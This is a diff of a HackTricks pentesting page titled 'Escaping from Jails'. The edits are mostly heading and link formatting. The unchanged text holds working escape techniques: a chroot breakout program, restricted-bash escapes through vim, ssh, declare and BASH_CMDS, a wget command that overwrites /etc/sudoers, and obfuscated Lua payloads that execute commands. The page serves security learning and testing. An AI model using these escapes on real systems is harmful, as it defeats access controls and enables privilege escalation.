@@ -1,4 +1,4 @@
-
+# Escaping from Jails
 
 <details>
 
@@ -16,14 +16,13 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
 </details>
 
-
-# **GTFOBins**
+## **GTFOBins**
 
 **Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **if you can execute any binary with "Shell" property**
 
-# Chroot limitation
+## Chroot limitation
 
-From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations):  The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** (**root**) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.
+From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** (**root**) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.
 
 Therefore, if you are **root** inside a chroot you **can escape** creating **another chroot**. However, in several cases inside the first chroot you won't be able to execute the chroot command, therefore you will need to compile a binary like the following one and run it:
 
@@ -74,9 +73,9 @@ chroot ".";
 system("/bin/bash");
 ```
 
-# Bash Jails
+## Bash Jails
 
-## Enumeration
+### Enumeration
 
 Get info about the jail:
 
@@ -88,7 +87,7 @@ export
 pwd
 ```
 
-## Modify PATH
+### Modify PATH
 
 Check if you can modify the PATH env variable
 
@@ -98,14 +97,14 @@ PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change
 echo /home/* #List directory
 ```
 
-## Using vim
+### Using vim
 
 ```bash
 :set shell=/bin/sh
 :shell
 ```
 
-## Create script
+### Create script
 
 Check if you can create an executable file with _/bin/bash_ as content
 
@@ -114,7 +113,7 @@ red /bin/bash
 > w wx/path #Write /bin/bash in a writable and executable path
 ```
 
-## Get bash from SSH
+### Get bash from SSH
 
 If you are accessing via ssh you can use this trick to execute a bash shell:
 
@@ -124,7 +123,7 @@ ssh user@<IP> -t "bash --noprofile -i"
 ssh user@<IP> -t "() { :; }; sh -i "
 ```
 
-## Declare
+### Declare
 
 ```bash
 declare -n PATH; export PATH=/bin;bash -i
@@ -132,7 +131,7 @@ declare -n PATH; export PATH=/bin;bash -i
 BASH_CMDS[shell]=/bin/bash;shell -i
 ```
 
-## Wget
+### Wget
 
 You can overwrite for example sudoers file
 
@@ -140,30 +139,30 @@ You can overwrite for example sudoers file
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
 
-## Other tricks
+### Other tricks
 
 [**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
-[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells**]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
-[https://gtfobins.github.io](https://gtfobins.github.io/**]\(https/gtfobins.github.io)\
+[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
+[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
 **It could also be interesting the page:**
 
 {% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
 [bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
 {% endcontent-ref %}
 
-# Python Jails
+## Python Jails
 
 Tricks about escaping from python jails in the following page:
 
-{% content-ref url="../../misc/basic-python/bypass-python-sandboxes/" %}
-[bypass-python-sandboxes](../../misc/basic-python/bypass-python-sandboxes/)
+{% content-ref url="../../generic-methodologies-and-resources/basic-python/bypass-python-sandboxes/" %}
+[bypass-python-sandboxes](../../generic-methodologies-and-resources/basic-python/bypass-python-sandboxes/)
 {% endcontent-ref %}
 
-# Lua Jails
+## Lua Jails
 
 In this page you can find the global functions you have access to inside lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
 
-**Eval** with command execution**:**
+**Eval** with command execution\*\*:\*\*
 
 ```bash
 load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
@@ -201,8 +200,6 @@ for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(
 debug.debug()
 ```
 
-
-
 <details>
 
 <summary><strong>Support HackTricks and get benefits!</strong></summary>
@@ -218,5 +215,3 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 **Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
 
 </details>
-
-
